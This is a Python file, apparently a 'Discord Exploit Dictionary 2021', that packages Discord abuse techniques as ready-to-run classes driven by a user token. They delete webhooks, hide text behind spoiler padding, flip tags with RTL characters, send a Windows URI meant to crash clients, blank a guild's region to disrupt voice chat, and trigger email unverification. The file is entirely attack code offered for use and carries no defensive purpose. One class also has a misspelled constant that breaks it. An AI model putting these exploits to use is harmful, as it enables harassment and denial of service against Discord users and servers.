# Discord Exploit Dictionary 2021
# Exploits from cs (checksum) : https://github.com/ecriminal/Discord-Exploit-Collection

import requests

class Exploits:
    # Api Abuse Exploits
    class apiabuse:
        class DeleteWebhook:
            def __init__(self, url):
                self.url = url

            def execute(self):
                requests.delete(self.url)


    # Render Exploits
    class render:
        class MaskMSG:
            def __init__(self, token, channel, message, hidden_message):
                self.token = token
                self.channel_id = channel
                self.message = message
                self.hidden_message = hidden_message
                self.headers = {'Authorization': token}

            def generateMessage(self, m1, m2):
                return m1 + ('||\u200b||' * 200) + m2

            def execute(self):
                requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': self.generateMessage(self.message, self.hidden_message)})
        
        class editTagChange:
            MAGIC_CHAR = '\u202b'
            def __init__(self, token, channel_id, message):
                self.token = token
                self.channel_id = channel_id
                self.message = message
                self.headers = {'Authorization': token}

            def execute(self):
                message = f'{self.MAGIG_CHAR} {self.message} {self.MAGIC_CHAR}'
                res = requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': message})
                if res.status_code == 200:
                    message_id = res.json()['id']
                    requests.patch(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages/{message_id}', headers=self.headers, json={'content': ' ' + message})
    # URI Exploits
    class URI:
        class WDoS:
            def __init__(self, token, channel):
                self.token = token
                self.channel_id = channel
                self.headers = {'Authorization': token}

            def execute(self):
                requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': '<ms-cxh-full://0>'})

    # Misc Exploits
    class Misc:
        class GuildVCDoS:
            def __init__(self, token, guild_id):
                self.token = token
                self.guild_id = guild_id
                self.headers = {'Authorization': token}

            def execute(self):
                requests.patch(f'https://discord.com/api/v8/guilds/{self.guild_id}', headers=self.headers, json={'region': ''})

        class UnverifyEmail:
            def __init__(self, token, channel_id):
                self.token = token
                self.channel_id = channel_id
                self.headers = {'Authorization': token}

            def execute(self):
                requests.get('https://discord.com/api/v6/guilds/0/members', headers=self.headers)
